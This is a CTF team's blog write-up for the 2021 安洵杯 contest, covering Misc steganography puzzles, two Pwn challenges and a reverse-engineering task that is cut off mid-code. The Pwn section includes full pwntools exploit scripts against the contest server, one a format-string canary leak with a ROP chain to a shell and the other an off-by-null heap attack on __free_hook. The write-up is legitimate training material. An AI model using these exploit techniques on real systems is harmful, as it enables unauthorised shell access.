<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>2021安询杯wp - n03tAck</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="n03tAck"><meta name="msapplication-TileImage" content="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/E595997D44EF7013BFD08323A4506527.png"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="n03tAck"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="2021安询杯wp"><meta property="og:type" content="blog"><meta property="og:title" content="n03tAck"><meta property="og:url" content="https://wp.n03tack.top/"><meta property="og:site_name" content="n03tAck"><meta property="og:description" content="2021安询杯wp"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Misc/clipboard_20211127_111541.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Misc/clipboard_20211127_111557.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Misc/clipboard_20211127_111610.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Misc/clipboard_20211127_111621.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Misc/clipboard_20211127_111630.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Misc/clipboard_20211127_111641.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Misc/clipboard_20211127_111651.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Misc/clipboard_20211127_111659.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Misc/clipboard_20211127_111707.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Misc/clipboard_20211127_111716.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Misc/clipboard_20211127_111725.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Misc/clipboard_20211127_111734.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Reverse/clipboard_20211127_111811.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Reverse/clipboard_20211127_111821.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Reverse/clipboard_20211127_111830.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Reverse/clipboard_20211127_111839.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Reverse/clipboard_20211127_111849.png"><meta property="og:image" content="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/1a0167c232810bd5.jpg"><meta property="article:published_time" content="2021-11-28T07:11:45.000Z"><meta property="article:modified_time" content="2021-12-17T09:56:42.774Z"><meta property="article:author" content="n03tAck"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Misc/clipboard_20211127_111541.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://wp.n03tack.top/posts/4906/"},"headline":"n03tAck","image":["https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Misc/clipboard_20211127_111541.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Misc/clipboard_20211127_111557.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Misc/clipboard_20211127_111610.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Misc/clipboard_20211127_111621.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Misc/clipboard_20211127_111630.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Misc/clipboard_20211127_111641.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Misc/clipboard_20211127_111651.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Misc/clipboard_20211127_111659.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Misc/clipboard_20211127_111707.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Misc/clipboard_20211127_111716.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Misc/clipboard_20211127_111725.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Misc/clipboard_20211127_111734.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Reverse/clipboard_20211127_111811.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Reverse/clipboard_20211127_111821.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Reverse/clipboard_20211127_111830.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Reverse/clipboard_20211127_111839.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Reverse/clipboard_20211127_111849.png","https://n03tack-wp-1302856486.file.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/1a0167c232810bd5.jpg"],"datePublished":"2021-11-28T07:11:45.000Z","dateModified":"2021-12-17T09:56:42.774Z","author":{"@type":"Person","name":"n03tAck"},"description":"2021安询杯wp"}</script><link rel="canonical" href="https://wp.n03tack.top/posts/4906/"><link rel="icon" href="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/E595997D44EF7013BFD08323A4506527.png"><meta name="referrer" content="no-referrer-when-downgrade"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/highlight.js/9.12.0/styles/vs2015.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css?family=Ubuntu:400,600|Source+Code+Pro|Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Microsoft YaHei:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&amp;amp;subset=latin,latin-ext|Inconsolata|Itim|Lobster.css"><script src="https://cdnjs.loli.net/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="/js/globalUtils.js"></script><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/pace/1.0.2/pace.min.js"></script><meta name="generator" content="Hexo 5.4.0"></head><body class="is-3-column has-navbar-fixed-top"><nav class="navbar navbar-main is-fixed-top"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/E595997D44EF7013BFD08323A4506527.png" alt="n03tAck" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">首页</a><a class="navbar-item" href="/archives">归档</a><a class="navbar-item" href="/categories">分类</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/about">关于</a><a class="navbar-item" href="/friend">战队成员</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Join Gitter" href="https://github.com/dota-st"><i class="fab fa-gitter"></i></a><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/dota-st"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a><a class="navbar-item" id="night-nav" title="Night Mode" href="javascript:;"><i class="fas fa-moon" id="night-icon"></i></a></div></div></div></nav><script type="text/javascript" src="/js/theme-setting.js"></script><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-9-widescreen"><!--!--><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2021-11-28  <a class="commentCountImg" href="/posts/4906/#comment-container"><span class="display-none-class">/posts/4906/</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="1f20c076560e82161bbefd55726fe5f6">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>36 分钟  <i class="fas fa-pencil-alt"> </i>5.4 k</span><span class="level-item" id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv">0</span>次访问</span></div></div><h1 class="title is-3 is-size-4-mobile">2021安询杯wp</h1><div class="content"><blockquote>
<p>2021安询杯wp</p>
<span id="more"></span>
</blockquote>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="应该算是签到"><a href="#应该算是签到" class="headerlink" title="应该算是签到"></a>应该算是签到</h3><p>来得早不如来的巧</p>
<p><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Misc/clipboard_20211127_111541.png" alt="img"></p>
<h3 id="CyzCC-loves-LOL"><a href="#CyzCC-loves-LOL" class="headerlink" title="CyzCC_loves_LOL"></a>CyzCC_loves_LOL</h3><p>小脑洞+老考点，理解一下</p>
<p><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Misc/clipboard_20211127_111557.png"></p>
<p>其实是放进百度翻译然后一下看出来了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&#x27;D0g3isthepAssword&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    tmp = <span class="built_in">ord</span>(s[i])-<span class="number">3</span></span><br><span class="line">    <span class="keyword">if</span>(tmp&lt;<span class="number">65</span>):</span><br><span class="line">        flag += <span class="built_in">chr</span>(tmp+<span class="number">26</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(tmp)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>密码为AGdJfpqebmXpptloa</p>
<p>然后解压得到图片和图片（</p>
<p>jpg那个图说是silent，于是知道是silenteye，右边的图不是piet就是brainloller，试了之后发现是brainloller</p>
<p>然后.\bftools.exe decode brainloller .\Program.png，得到的brainfuck解码一下得到0MTTW CWZVN!，空格替换下划线即可</p>
<p>然后silenteye解jpg，密码为0MTTW_CWZVN!</p>
<p><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Misc/clipboard_20211127_111610.png" alt="image-20211127132846544"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D0g3&#123;544f3225-bbaf-47dc-ba8d-5bda54cbaecb&#125;</span><br></pre></td></tr></table></figure>





<h3 id="Cthulhu-Mythos"><a href="#Cthulhu-Mythos" class="headerlink" title="Cthulhu Mythos"></a>Cthulhu Mythos</h3><p>hint.mp3是sstv，后面那段扫一下即可</p>
<p><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Misc/clipboard_20211127_111621.png" alt="image-20211127132323377"></p>
<p>解码</p>
<p><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Misc/clipboard_20211127_111630.png" alt="image-20211127132339086"></p>
<p>根据提示猜测是泰拉瑞亚，去github下载一个地图编辑器</p>
<p><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Misc/clipboard_20211127_111641.png" alt="image-20211127132355014"></p>
<p>进去就看到7I4YF6QL0</p>
<p>然后猜测剩下的在对话里之类的，之后在分析里找到内容</p>
<p><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Misc/clipboard_20211127_111651.png" alt="image-20211127132433518"></p>
<p>导出后看txt</p>
<p><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Misc/clipboard_20211127_111659.png" alt="image-20211127132453517"></p>
<p>按顺序撸下来,得到</p>
<p><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Misc/clipboard_20211127_111707.png" alt="image-20211127132535376"></p>
<p>emm能看出来前面和后面都有错误，但是前面能知道是D0g3{M1necR4ft_G0_A     后面是d_Try_Terr4ria!}</p>
<p>然后觉得中间填and，尝试提交发现正确，所以flag为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D0g3&#123;M1necR4ft_G0_And_Try_Terr4ria!&#125;</span><br></pre></td></tr></table></figure>



<h3 id="lovemath"><a href="#lovemath" class="headerlink" title="lovemath"></a>lovemath</h3><p>爆CRC</p>
<p><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Misc/clipboard_20211127_111716.png" alt="image-20211127152845936"></p>
<p>得到密码</p>
<p>th1s_Is_Y0ur_pa33w0rd_We1c0m3e</p>
<p>blind是LSB，BGR的，提取出来一个图片纯数字</p>
<p>然后用QQ OCR一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1251077695482776025338577125579215707216262981842821000162276994967943212822693842845266851984880336702446444408289977864567921038435144120176357529686342977212633764247620567669441602729004003473312468776582473461071462631554533766709934484393185739708817165738912742570170547790145328253304755428563911689057632001795598667127514331122190795355921436735375126688142856470280128821316586008242687241930886868804388482643589009068543771977163419519208340324352</span><br></pre></td></tr></table></figure>

<p>结合题目给的甚至能画出自己</p>
<p>找到了塔珀自指公式，然后github发现有解码的网站</p>
<p><a target="_blank" rel="noopener" href="http://keelyhill.github.io/tuppers-formula/">http://keelyhill.github.io/tuppers-formula/</a></p>
<p><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Misc/clipboard_20211127_111725.png" alt="image-20211127153422115"></p>
<p>反过来看即可</p>
<p><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Misc/clipboard_20211127_111734.png" alt="image-20211127153445210"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D0g3&#123;I_LOV3_math&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h3><p>格式化字符串泄露基地址和canary，计算出pop,system,/bin/sh在程序中的地址然后栈溢出即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;47.108.195.119&#x27;</span>,<span class="number">20113</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">&#x27;n03tAck&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&#x27;Mumuzi&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">payload=<span class="string">&#x27;%11$p%9$p&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">canary=<span class="built_in">int</span>(p.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&quot;canary:&quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line">start_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&quot;start_addr:&quot;</span> + <span class="built_in">hex</span>(start_addr))</span><br><span class="line">addrbase=start_addr-<span class="number">0x0870</span></span><br><span class="line">sys_addr=<span class="number">0x000A8c</span>+addrbase</span><br><span class="line">binsh_addr=<span class="number">0x00B24</span>+addrbase</span><br><span class="line">pop_rdi=<span class="number">0x0000000000000b03</span>+addrbase</span><br><span class="line">success(<span class="string">&quot;sys_addr:&quot;</span> + <span class="built_in">hex</span>(sys_addr))</span><br><span class="line">success(<span class="string">&quot;binsh_addr:&quot;</span> + <span class="built_in">hex</span>(binsh_addr))</span><br><span class="line">success(<span class="string">&quot;pop_rdi:&quot;</span> + <span class="built_in">hex</span>(pop_rdi))</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x18</span>)+p64(canary)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(binsh_addr)+p64(sys_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>连上之后cat sky_token然后exit输入sky_token即可</p>
<p>本来一开始是windows跑的每次exit输入sky_token都显示我错误，只好去打开ubuntu老老实实跑一下了</p>
<h3 id="noleak"><a href="#noleak" class="headerlink" title="noleak"></a>noleak</h3><p>1.思路：off by null打__free_hook</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process(&#x27;./noleak1&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;47.108.195.119&#x27;</span>,<span class="number">20182</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./noleak1&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *$rebase(0xfc9)&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;n03tAck&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1u1u&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;please input a str:&#x27;</span>,<span class="string">&#x27;\x4e\x30\x5f\x70\x79\x5f\x31\x6e\x5f\x74\x48\x65\x5f\x63\x74\x37&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params"><span class="built_in">id</span>,size</span>):</span></span><br><span class="line">	menu(<span class="number">1</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Index?\n&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Size?\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	menu(<span class="number">2</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Index?\n&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span></span><br><span class="line">	menu(<span class="number">3</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Index?\n&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;content:\n&#x27;</span>,<span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	menu(<span class="number">4</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Index?\n&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x450</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x4f0</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x480</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x450</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">leak=u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">malloc_hook=leak+<span class="number">0x7f3223b9bc30</span>-<span class="number">0x7f3223b9bca0</span></span><br><span class="line">success(<span class="string">&#x27;malloc_hook:&#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">libc_base=malloc_hook-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x18</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">5</span>,p64(libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x30</span>)</span><br><span class="line">edit(<span class="number">6</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>





<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="sign-in"><a href="#sign-in" class="headerlink" title="sign_in"></a>sign_in</h3><p>一个贪吃蛇游戏（又是一个嵌屎的题）</p>
<p>smc</p>
<p><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Reverse/clipboard_20211127_111811.png"></p>
<p>直接动调，然后手动改跳转进入该函数。</p>
<p><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Reverse/clipboard_20211127_111821.png" alt="image-20211127223559201"></p>
<p>是shuffle+xxtea</p>
<p>先解xxtea</p>
<p>因为我是改条件跳转的，所以要爆破delta。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span>  </span></span><br><span class="line"><span class="comment">//#define DELTA (0x44336730+ 0x13) </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MX (((z&gt;&gt;5^y<span class="meta-string">&lt;&lt;2) + (y&gt;</span>&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[((p&amp;3)^e)] ^ z)))  </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">btea</span><span class="params">(<span class="keyword">uint32_t</span>* v, <span class="keyword">int</span> n, <span class="keyword">uint32_t</span> <span class="keyword">const</span> key[<span class="number">4</span>],<span class="keyword">int</span> DELTA)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="keyword">unsigned</span> p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>)            <span class="comment">/* Coding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">        z = v[n - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n - <span class="number">1</span>; p++)</span><br><span class="line">            &#123;</span><br><span class="line">                y = v[p + <span class="number">1</span>];</span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n - <span class="number">1</span>] += MX;</span><br><span class="line">        &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>)      <span class="comment">/* Decoding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        n = -n;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">        sum = rounds * DELTA;</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = n - <span class="number">1</span>; p &gt; <span class="number">0</span>; p--)</span><br><span class="line">            &#123;</span><br><span class="line">                z = v[p - <span class="number">1</span>];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z = v[n - <span class="number">1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span 